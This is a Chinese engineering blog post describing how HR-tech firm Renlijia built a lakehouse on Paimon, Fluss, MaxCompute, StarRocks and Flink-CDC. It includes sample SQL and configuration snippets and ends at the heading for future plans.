li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：石玉阳，花名：Thorne， Flink-CDC Contributor，人力家资深数据工程师</p>
<h2 data-id="heading-0">一、简介</h2>
<p>仁励家网络科技（杭州）有限公司 简称“人力家”成立于2018 年，由钉钉与人力窝共同投资成立，是一家技术领先的人力资源数字化科技公司。</p>
<p>基于中国企业协同办公占有率排名第一的钉钉平台，提供一体化人力资源数字化解决方案和一站式人力资源管理服务，加速对中国企业人力资本服务的数字化赋能，实现人力资本管理的新工作方式，公司的使命愿景是 “普惠人力” “让HR进入数智化时代”。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2f3aad38ae9448c9d031139b34cf2dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=MmU6dcRo6WiaE1i%2BvK08f46vVvs%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">1.1、数仓初期：</h3>
<p>在早期，人力家的内部数据仓库主要依托于MaxCompute这一强大的数据仓库软件进行数据处理与分析和DataWorks作为一站式数据开发平台，其中DataWorks的数据集成作为ETL软件，实时计算采用Flink VVR（Ververica Runtime） 作为计算引擎，离线/实时计算涵盖了财务、运营、APP、CRM、GTM、CS等多个业务域。随着对实时数据分析需求的日益增长，早期数仓存在一些弊端。包括：数据割裂（同一份数据可能存储在不同地方）、数据新鲜度低（T+1）、数据修复难度大/成本大、数据格式不够开放等问题频发。</p>
<h3 data-id="heading-2">1.2、数仓加速成长：</h3>
<p>随着新业务线的扩展，原有的大数据技术栈已经不能满足新产品睿人事（HCM）对OLAP极速分析的需求，公司需要一个能承载极速分析软件的外部客户的实时数仓，最终StarRocks凭借其MPP架构+Pipeline引擎+CBO优化器+Lakehouse架构的优秀表现被采纳。使用StarRocks来构建实时数仓帮助用户加速OLAP和复杂业务逻辑的构建，其中使用view table 建模，异步物化视图、生成列来加速OlAP查询。</p>
<h3 data-id="heading-3">1.3、湖仓最终形态：</h3>
<p>经过近一年的不懈努力，我们公司已经构建了一个具备可持续性、可扩展性和灵活性的湖仓系统，为未来数据技术的发展奠定了坚实的基础。</p>
<p>首先，我们的湖仓系统采用了开放的数据格式，这使得数据不再受制于特定的计算引擎或云服务提供商。这种开放性为用户提供了极大的自由度，可以根据实际需求灵活选择最适合的计算工具和技术栈。例如，无论是Apache Spark、Flink还是StarRocks，都可以无缝地与我们的湖仓系统集成，从而实现高效的数据处理和分析。</p>
<p>其次，该湖仓架构支持多种计算模式之间的平滑切换。批处理、流处理以及增量计算等不同类型的计算任务可以在同一平台上进行，无需额外的迁移成本。这种多模式计算的支持极大地提高了系统的适应性和效率。例如，在面对大规模历史数据分析时，我们可以采用批处理模式；而在需要实时响应业务变化的情况下，则可以快速切换至流处理模式。此外，对于那些只需对新增数据进行处理的场景，增量计算模式则能够显著提升性能并减少资源消耗。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f603d46996a45b18b30385d84bf3288~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=Udqz7ctA8uFRX10FZkQw0dNaBjA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-4">二、湖仓思考</h2>
<p>在探索湖仓架构的过程中，我们遇到了一些挑战。市场上存在多种不同的湖仓解决方案，尽管它们都声称能够提供“一体化”的体验，但实际上由于标准不一、术语混乱等因素，导致不同产品之间难以实现无缝集成。例如：</p>
<ul>
<li>
<p><strong>MaxCompute</strong> 主要用于其内部表的大批量处理工作，其推出的湖仓能力还是外挂数据，没有做到数据间无缝衔接，数据格式不够开放和云厂商强绑定，OLAP速度较为不理想。</p>
</li>
<li>
<p><strong>StarRocks</strong> 虽然标榜为湖仓解决方案之一，但在处理大规模离线任务时仍显不足。</p>
</li>
<li>
<p><strong>数据湖（Iceberg、Hudi、Delta lake）</strong> 三剑客在整体上均可以满足我们对湖仓的思考和定位，但是其流处理能力略显不足。</p>
</li>
<li>
<p><strong>Paimon</strong>数据湖既能满足流计算也能满足批量计算需求，但是没办法解决实时数据新鲜度的问题。</p>
</li>
<li>
<p><strong>多模态数据：</strong> AI场景的多模态数据计算和检索。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f839c4e4e8a14c62a9ad6e5b60e3e253~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=XooDsGihjuJmpOKsYARIasNixmA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">三、湖仓选型</h2>
<h3 data-id="heading-6">3.1、思考点</h3>
<p>当前，大数据技术领域呈现出百花齐放的态势，这为用户在选择合适的工具和技术栈时带来了挑战。从行业实践来看，Apache Spark已成为批处理的事实标准，而Apache Flink则是流计算的事实标准；至于数据湖解决方案，Apache Iceberg正逐渐成为业界共识的选择之一。此外，随着人工智能（AI）计算需求的增长，向量检索与机器学习（ML）等领域也日益受到重视。</p>
<p>对于终端用户而言，依赖单一计算引擎并不符合实际需求。因此，构建一个能够支持多种计算引擎同时工作的生态系统显得尤为重要。关键在于实现存储层的数据格式标准化，确保不同类型的计算任务均可直接访问相同的数据源，而无需经历复杂的转换过程。换句话说，就是要打破数据与特定处理框架之间的绑定关系，采用开放且兼容性强的数据存储格式，使得无论何种计算引擎都能够轻松地根据既定规范读取并处理这些信息。</p>
<h3 data-id="heading-7">3.2、技术选型</h3>
<p>在构建开放数据湖的过程中，我们旨在打破数据孤岛，确保数据不被绑定于单一计算引擎，同时减少存储成本与使用成本。经过对Paimon、Iceberg、Hudi及Delta Lake等方案的深入调研后，基于以下几点考量：</p>
<ol>
<li>
<p><strong>批处理和流处理能力</strong>：能同时满足批计算和流计算的场景。</p>
</li>
<li>
<p><strong>支持多样化计算模式</strong>：要求能够无缝支持流式与批处理计算，包括但不限于部分列更新、聚合表、索引等功能。</p>
</li>
<li>
<p><strong>生态兼容性</strong>：高度集成Flink、Spark、StarRocks等主流计算框架。</p>
</li>
<li>
<p><strong>社区活跃度</strong>：活跃的开发者社区、快速响应问题并持续创新的能力。</p>
</li>
<li>
<p><strong>数据新鲜度</strong>：可以和Fluss结合，弥补数据新鲜度的不足。</p>
</li>
<li>
<p><strong>多模态数据：</strong> 可以支持多模态数据检索和计算。</p>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4746ef67e9e247b19889c2057cb3711a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=nXc3mWM6VDm4cNewpbEjfcXHtVg%3D" alt="image.png" loading="lazy"/></p>
<p>综上所述，基于阿里云OpenLake解决方案，最终决定采用Paimon作为核心数据湖技术，Fluss作为弥补Paimon数据新鲜度不足的前置处理，并通过阿里云提供的全托管Serverless服务形式部署，即商业版DLF（集成了Paimon、元数据管理和serverless架构、鉴权）。这一架构不仅满足了项目对于灵活性、性能和安全性方面的需求，还充分利用了云计算的优势来降低运维复杂度。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7216d4c82a5b4cf5bb295c8cee732dab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=ZiK%2BywWNVyMYO1%2F01YP4CnRA0yU%3D" alt="image.png" loading="lazy"/></p>
<p>图片参考：阿里云OpenLake解决方案</p>
<h2 data-id="heading-8">四、湖仓/湖流一体</h2>
<h3 data-id="heading-9">4.1、离线计算DLF+MaxCompute</h3>
<p>我们舍弃了内部数仓中之前ETL作业，直接在数据标准层（dwd）直读DLF中的数据，得益于MaxCompute支撑的三层数据访问模型，我们仅需要轻微的改动，直接可以替换之前ODS层的数据。</p>
<pre><code class="hljs language-plaintext" lang="plaintext">SET odps.namespace.schema = true;  -- 开启三层数据访问模型

INSERT OVERWRITE TABLE dwd_user_basic
SELECT
  corp_id,
  user_id,
  active,
  status,
  union_id,
  id,
  CAST(gmt_create   AS DATETIME) AS gmt_create,
  CAST(gmt_modified AS DATETIME) AS gmt_modified
FROM paimon_catalog.xxdb_prod.user_basic_table
WHERE active = 1;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5dd9005830402595ac0ed7fcc52ac2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=eXB682sTl84lwoBC8pxLXDDrOLQ%3D" alt="image.png" loading="lazy"/></p>
<p>MaxCompute中上层表的加工、计算逻辑不变，对于需要存入数据湖的数据直接写入Paimon中，供Flink、Starocks查询计算，如果用户使用的是Apache Spark，这里同样可以做到可替换成Apache Spark作为批计算引擎。</p>
<h4 data-id="heading-10">4.1.1、AGG Table（聚合表）</h4>
<p>我们一直需要Agg Table的能力，以显著降低周期累计表的数据计算成本。尽管MaxCompute目前尚不支持这一功能，但我们已将此能力迁移到数据湖Paimon中，并成功将高成本的埋点周期累计表费用降低了70%。对于周期累积表，采用Paimon后，每日T+1计算仅需处理增量数据，而无需像在MaxCompute中那样全量合并历史与新增数据来求取事件事实的最大、最小值（如时间）。在Maxcompute中，只需将新产生的数据插入DLF，由其后台自动完成合并工作，但存在约1至10分钟的延迟。鉴于无法准确得知DLF完成数据合并的具体时刻，我们在Dataworks里增设了一个Python节点，设定该节点休眠10分钟后才启动下游任务调度，确保既不影响整体流程又能获取到最新的Agg Table的数据。</p>
<pre><code class="hljs language-plaintext" lang="plaintext">import time

# 给 Paimon 进行 compaction 预留延迟时间，帮助下游使用。
time.sleep(60 * 10)

print("睡眠 10 分钟结束")
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d50ab366e0824b48b7bc940112bae4ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=E0dgCvWGVfgHPTez6BoVmEztodw%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-11">4.2、OLAP场景 DLF+StarRocks</h3>
<p>LakeHouse架构无疑是当前大数据的发展和趋势，通过LakeHouse架构我们可以无缝集成多Source数据，不让数据强行绑定在单一计算引擎上，解决过去无法从单一的产品中快速解放出来，减少ETL过程和数据复杂度，在不改变原有业务的情况下， 进行极速分析。</p>
<h4 data-id="heading-12">4.2.1、建模过程</h4>
<p>早期建模使用异步物化视图表进行建模，但是会存在延迟问题，无法使用最新鲜的ods的数据，每一层的调度都存在一定的延迟可能，如果是3层，每一层是定时5分钟刷新一次，如果刚好卡上时间点，数据从ods到ads层的数据延迟最大能达到近15分钟，上层ads层的数据最大延迟时间是物化试图刷新时间可能会达到最大值才能展示数据。</p>
<p>针对上述情况，结合阿里云和StarRcocks分享案例，采用view sql（逻辑视图）建模为主，这么做的好处是，view table 存储的数据sql的逻辑，直接执行后会把需要进行查询的数据透传到最底层的ods层。保证数据新鲜度是自己准实时的数据，而且利用了view table 来进行了分层，这样保证了每一层只处理了自己相关的业务逻辑， 但这么处理建模逻辑活成，即会有优点，也会有缺点，主要体现如下：</p>
<p>1、主要优点：</p>
<p>view table是无状态的，view table里面只存储了DQL 查询语句，每次只需要进行相关view 表的逻辑即可，不需要关心底层的数据。按照逻辑封层，对于建模过程是非常合理的，开发成本很低。</p>
<p>2、主要缺点：</p>
<p>因为view 表没有存储数据，用户在查询view表的时候会透传到最底层的ods实体表中来扫描数据，如果ods层的基表数据量很大且没有经过加工，那么olap的速度不会得到明显提升。用户端体验不是很好。</p>
<p>面对上面的缺点，我们物化视图/生成列中使用解决办法帮助用户进行加速OLAP大查询</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c766ca24da4c4db6b52d535767fe964b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=xqMKIo62xMekXFB7UzAzvhEBBIc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-13">4.2.2、物化视图/生成列加速+透明改写</h4>
<p>对于报表中需要透出的OLAP 表，我们可以新建一个和view table逻辑相同的物化视图来进行加速。每10分钟进行一次调度任务，这里是每次全量的异步物化视图刷新。</p>
<p>用户可以根据自己的实际业务情况来进行物化视图的更新方式，目前StarRocks的异步物化视图刷新主要是两种，一种是异步的全量，另一种是异步的分区增量级别刷新，分区增量刷新需要依赖基表是分区表才可以实现，如果业务表没有分区，全量的异步物化视图刷新是比较耗费内存和cpu+运行时间。</p>
<h4 data-id="heading-14">4.2.3、生成列（Generated Column）</h4>
<p>业务DB具有很多的半结构化数据，尽管StarRocks在早期就对JSON数据类型进行了优化，但是查询一个JSON中的数据远不如直接查询一个字段来的检索效率高，这时候我们采用生成列，把JSON中一些固定字段脱离出来，在不影响原有的业务逻辑，查询效率约等于查询固定字段的效率。 </p>
<p><strong>语法如下，可以在建表的时候创建，也可以后期增加，不影响源表的任何逻辑</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">col_name data_type [NULL] AS generation_expr [COMMENT 'string'];
</code></pre>
<p><strong>查询改写</strong></p>
<p>如果查询中的表达式与某个生成列的表达式匹配，则优化器会自动进行查询改写，直接读取生成列的值，这里不需要用户的任何操作，极大的方便了数据开发和数据模型的维护。</p>
<pre><code class="hljs language-plaintext" lang="plaintext">-- 后期增加生成列（也可以在建表语句时直接定义生成列）
ALTER TABLE ods_hrm_basic
ADD COLUMN dept_name STRING
AS get_json_string(data, '$.dept_name')
COMMENT '部门名称';

-- base DQL 语句：推荐不改原始 DQL
SELECT
  corp_id,
  get_json_string(data, '$.dept_name') AS dept_name
FROM ods_hrm_basic;

-- 优化器会自动识别已存在的生成列，对用户无感
SELECT
  corp_id,
  dept_name
FROM ods_hrm_basic;
</code></pre>
<h4 data-id="heading-15">4.2.4、物化视图透明改写</h4>
<p>StarRocks 的异步物化视图采用了主流的基于 SPJG（select-project-join-group-by）模式透明查询改写算法。在不修改查询语句的前提下，StarRocks 可以自动将在基表上的查询改写为在物化视图上的查询。通过其中包含的预计算结果，物化视图可以帮助您显著降低计算成本，并大幅加速查询执行。</p>
<p>下图是StarRocks中的异步物化视图的改写逻辑，这里不仅支持内表的改写，同样支持外表的改写。对于查询走到1链路，还是2链路，对于用户是无感的，由StarRocks优化器自行判断和操作，且StarRocks保证了数据强一致性。StarRocks<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.starrocks.io%2Fzh%2Fdocs%2Fusing_starrocks%2Fasync_mv%2Fuse_cases%2Fquery_rewrite_with_materialized_views%2F%23%25E4%25BD%25BF%25E7%2594%25A8%25E5%259C%25BA%25E6%2599%25AF" target="_blank" title="https://docs.starrocks.io/zh/docs/using_starrocks/async_mv/use_cases/query_rewrite_with_materialized_views/#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF" ref="nofollow noopener noreferrer">物化视图改写简介</a>里有详细的介绍，这里不做过多说明。</p>
<p>案例参考如下：</p>
<pre><code class="hljs language-plaintext" lang="plaintext">DROP MATERIALIZED VIEW if exists ads_tb_ab_mv;          
CREATE MATERIALIZED VIEW ads_tb_ab_mv          
DISTRIBUTED BY HASH(corpid,corp_name,rule )          
REFRESH ASYNC START('2025-11-15 00:10:24')           
EVERY (interval 10 Minute)          
as           
SELECT corpid,corp_name,rule,xxxxxxxx          
from ads_tb_ab          
;
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa1e25c5ada14578b86db5a6cd1019a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=A%2BBu%2BZmh7wENqAzwQdXo%2BfKyLqo%3D" alt="image.png" loading="lazy"/></p>
<p>对于外部客户数仓中，我们依然需要继续使用StarRocks作为查询引擎，查询Paimon中的ODS层的同一份数据。外部数仓中的加工处理逻辑不变，整体保证统一。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fe5599dd9f5459e9e90ce974187edcd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=wtrJnRstRRIQsq5FPC5bYTINyJo%3D" alt="image.png" loading="lazy"/></p>
<p>对于ODS上层的数据，因为外部数仓和内部数仓是逻辑上隔离的，但本质其都是架构上湖仓上的数仓，对于一些用户行为数据（登录、发送、埋点）等，我们会按需写入数据湖中，Maxcompute和StarRocks同样都支持写入Paimon，保持业务最小侵入，按需供给。</p>
<h4 data-id="heading-16">4.2.5、OLAP整合</h4>
<p>得益于StarRocks中强大的OLAP基因，我们内部BI基本从过去的MaxCompute 替换成StarRocks作为内部BI的OLAP数据库（支持谓词下推），而且得益于StaRocks的LakeHouse架构，我们还可以使用在StarRocks挂载Paimon的Catalog，充分利用Data cache 机制+DV表+数据预热，充分加速内部BI速度，从MaxCompute切换到StarRocks中，只要改动部分少许的兼容函数即可。基本能做到99%可替换。</p>
<h3 data-id="heading-17">4.3、实时计算DLF+Flink+Fluss</h3>
<h4 data-id="heading-18">4.3.1、实时数据采集</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a77609baa7554792a0ff3059710f05fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=FPnj1eiwCWNo3ckOepUfOwGlqX8%3D" alt="image.png" loading="lazy"/></p>
<p>全面采用Flink-CDC-Yaml语法来采集业务DB（polardb/mysql）数据入湖Paimon中，现在支持cdc和合并解耦，Flink-CDC只负责传输数据，后台合并交于DLF后台自动智能合并，且Flink-CDC-Yaml的优点如下：</p>
<ol>
<li>
<p>更轻量化的开发逻辑、易于开发、性能更好，框架更稳定，启动模式丰富。</p>
</li>
<li>
<p>支持整库同步+Schema Change+Sink节点复用+Flink丰富的上下游生态。</p>
</li>
<li>
<p>支持Route，解决过去分库分表和整库同步不能复用source的问题，过去需要写两个CDAS语句</p>
</li>
<li>
<p>支持Transform，可以在ETL的过程中增加一些必要性的字段转换。</p>
</li>
<li>
<p>支持Exactly-once和At-least-once模式，保证数据不丢。</p>
</li>
<li>
<p>丰富的启动方式，支持快速修补数据，包括init（全增量） 、最新点位启动、最早点位启动、时间戳、特殊点位启动、快照启动和快照数据过滤启动（社区有pr，还没合并），基本能做到最小代价来获取数据/修复数据。</p>
</li>
<li>
<p>支持Pipeline框架并行获取历史数据，极大加速历史快照数据，支持无锁拿最新数据，不需要锁表，锁库，增量阶段全局保序，保证数据不乱。</p>
</li>
<li>
<p>支持自动加表，符合正则匹配的新表不需要重启作业即可同步数据到sink端。</p>
</li>
<li>
<p>未来会支持限流（社区已经有这个讨论）</p>
</li>
<li>
<p>相比CDAS语法，算子拓扑图更简单，性能更好，CDAS语法糖中，每一个表都是一个单独的sink额外算子，作业复杂度较高。</p>
</li>
</ol>
<pre><code class="hljs language-plaintext" lang="plaintext">source:
  type: mysql
  hostname: localhost
  port: 3306
  username: root
  password: "123456"
  tables: "app_db\..*"
  server-id: "5400-5404"
  server-time-zone: UTC

sink:
  type: starrocks
  name: StarRocks Sink
  jdbc-url: "jdbc:mysql://127.0.0.1:9030"
  load-url: "127.0.0.1:8080"
  username: root
  password: ""
  table.create.properties.replication_num: 1

pipeline:
  name: Sync MySQL Database to StarRocks
  parallelism: 2
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2301a62c096944748fd9bc9945aed63c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=KH6oPOenSi1vvK29QYFzo740ZFw%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-19">4.3.2、实时数据计算</h4>
<p>全面采用Flink作为实时计算引擎，DLF作为元数据、鉴权、数据提供，目前实时计算主要是供给内部用户使用的客户画像画像来辅助业务端来进行分析，决策，考虑未来增量计算的场景，同样可以在Flink中完成增量计算的需求，因为DLF后台的数据合并也是Flink引擎，数据入湖后的合并需要Flink来进行计算，以及未来可能考虑的Flink增量计算。</p>
<p><strong>Fluss+Flink弥补湖仓数据新鲜度</strong></p>
<p>Fluss目前主要承接我们内部系统的用户画像，初始阶段，我们的用户画像基础计算表是由于Mysql承接（Binlog+部分列更新能力），因为计算用户画像的流量很高，我们利用Flink 的开窗函数来进行攒批数据写入Mysql，并使用Flink 结合使用多流pk （相同主键）部分列更新能力来减少下游Mysql的压力和Flink的状态，但随着用户体量的增加，出现了性能问题。后面我们把用户画像基表迁移到了Paimon，Paimon虽然可以解决我们的性能问题，但是没办法解决Paimon的的分钟级别的数据新鲜度的问题，随着Fluss的开源，我们把目光投入到了Fluss，主要优点如:、Delta join、数据写入即可见、Union Read、湖流一体等。 </p>
<p>如果使用Flink来查询Fluss上的数据是一个比较慢的过程，比如我们做一些ad hoc或者排错还是比较慢，经过和云厂商沟通，现在我们可以使用阿里云上的EMR-Serverless-StarRocks来查询Fluss中的湖表的数据且支持Union Read来保证数据一致性。</p>
<p>Fluss作业参考：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/882db0059e8b472fab31715c23140587~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=QV4kbvZdLqETX3rEGbBvrylsH5Y%3D" alt="image.png" loading="lazy"/></p>
<p>同样Fluss也在持续推进多模态数据集成，这也是我们期待的能力点。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26f8b478c55f49a1bf30013eaf2e74b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=vkEbHvFIOHMm31zwsEilAvd7YYI%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-20">五、当前的成果与问题</h2>
<h3 data-id="heading-21">5.1、湖仓一体/湖流一体</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6450d4df57e4c4e866154b80c0bd50b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892953&amp;x-signature=aVVODHN0N8t7bgiAyZPJIJ9Laww%3D" alt="image.png" loading="lazy"/></p>
<ol>
<li>
<p>数据基座</p>
<ol>
<li>
<p>确定以Paimon作为数据基座，计算引擎消费Paimon中的数据，数据入湖后，其他加工依据湖上数据进行加工产出数据，最后数据回流到Paimon中。</p>
</li>
<li>
<p>确定Fluss作为作为数据湖前的中转站，作为湖流一体的能力，更符合其流存储的定位和能力，数据最终还是入湖。</p>
</li>
</ol>
</li>
<li>
<p>计算引擎</p>
<ol>
<li>
<p>MaxCompute作为大批量的离线计算引擎为主。</p>
</li>
<li>
<p>Flink作为实时计算引擎为主，Flink-CDC作为数据入湖、入仓的ETL工具。</p>
</li>
<li>
<p>其他引擎少量为辅的主要技术栈，减少技术栈和维护成本和学习成本。</p>
</li>
</ol>
</li>
<li>
<p>OLAP</p>
<ol>
<li>确定以StarRocks为OLAP为主的报表引擎支撑，内部报表+外部客户报表全面采用StarRocks作为OLAP查询引擎。</li>
</ol>
</li>
<li>
<p>数据开发/元数据管理/鉴权</p>
<ol>
<li>
<p>确定按照Dataworks为主要离线数据开发平台</p>
</li>
<li>
<p>实时开发采用 Ververica Platform （VVP） 实时开发平台</p>
</li>
<li>
<p>DLF元数据管理为主的数据构建平台。</p>
</li>
</ol>
</li>
<li>
<p> 多模态</p>
<ol>
<li>Lance file 作为多模态数据存储格式，同样Paimon/Fluss在持续跟进lance的推荐和集成。</li>
</ol>
</li>
</ol>
<h3 data-id="heading-22">5.2、湖仓一体/湖流一体优势</h3>
<p>1、数据永远只存储一份，不再割裂，架构简单，可替换。</p>
<p>2、数据的格式是开放的、计算引擎不再强绑定，做到随时可替换，数据可共享、数据不再割裂。</p>
<p>3、同一份数据可以随时在离线计算、实时计算、增量计算，保证计算需求的多样性和未来可持续性迭代，满足不同业务对时效、成本的全方面考虑。</p>
<p>4、保持其可扩展性，包括多模态数据，一样可以入湖后供需要的引擎消费</p>
<p>5、数据新鲜度：可以做到计算随时可切换批计算、流计算、增量计算等。</p>
<p>综上，我们确定了公司的内部大数据的架构图，湖仓一体已经是大数据的趋势和事实，外加DATA+AI的场景，我们在底层存储层选择了更开放的湖格式，这样湖上的数据不和任何计算引擎进行绑定，业务端按照其数据协议读取数据数据即可；数据存储一份，解决过去数据即需要存储在A有需要存储在B的痛点，数据存储成本直线下降；技术栈统一，方便后期的开发和维护。更利于大数据的长期发展。</p>
<h3 data-id="heading-23">5.3、一些问题点</h3>
<ol>
<li>
<p>MaxCompute直拉DLF3的数据，有些谓词下推，下推的不理想，导致会获取全量数据再过滤出来。</p>
</li>
<li>
<p>MaxCompute直拉DLF3的数据过程中，有些表拆分的mapper的数量不够理想，导致拉取DLF上数据慢了点（已反馈）。</p>
</li>
<li>
<p>DLF 的对于Maxcompute批写入数据的合并时间不确定（1-10分钟），产品已有规划改进，对于一些Maxcompute中批作业支持写入后立刻合并。</p>
</li>
<li>
<p>Paimon和Fluss的有些DDL操作必须依赖Flink，我们希望更精简化下操作。</p>
</li>
<li>
<p>DLF还不支持对管控Paimon表的消费者进行管理。</p>
</li>
<li>
<p>Flink-CDC-Yaml还不支持VVP Flink 的自动调优（在路上），防止作业OOM的时候可以自己加内存。</p>
</li>
<li>
<p>Fluss还不支持 AGG Table 和 RoaringBitmap。</p>
</li>
<li>
<p>StarRocks 目前还不支持查询Fluss中非湖表。</p>
</li>
</ol>
<h2 data-id="heading-24">六、未来规划</h2>
